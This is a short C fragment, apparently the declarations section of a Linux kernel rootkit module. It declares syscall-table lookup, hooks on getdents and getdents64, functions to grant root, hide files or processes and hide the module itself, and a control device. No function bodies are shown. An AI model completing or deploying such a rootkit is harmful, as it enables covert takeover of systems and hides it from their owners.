struct linux_dirent {
               unsigned long  d_ino;     /* Inode number */
               unsigned long  d_off;     /* Offset to next linux_dirent */
               unsigned short d_reclen;  /* Length of this linux_dirent */
               char           d_name[];  /* Filename (null-terminated) */
};

static void** find_sys_call_table(void);
asmlinkage static int sys_getdents64_hook(struct pt_regs*);
asmlinkage static int (*original_getdents64)(struct pt_regs*);
asmlinkage static int (*original_getdents)(struct pt_regs*);
asmlinkage static int sys_getdents_hook(struct pt_regs*);
static unsigned int hook_getdents(void);
static unsigned int restore_getdents(void);
static unsigned int make_root(unsigned long);
static unsigned int make_invisible(unsigned long);
static unsigned int make_visible(unsigned long);
static unsigned int is_invisible(unsigned long);
static void make_string_process(char*, size_t);
static void make_string_invisible(char*, size_t);
static ssize_t dev_read(struct file *, char *, size_t, loff_t *);
static ssize_t dev_write(struct file *, const char *, size_t, loff_t *);
static int get_proc_ino(void);
static int my_dev_uevent(struct device *, struct kobj_uevent_env *);
static int register_device(void);
static int hide_module(void);
static int unhide_module(void);
static int unregister_device(void);
static int __init start_coodkid(void);
static void __exit stop_coolkid(void);

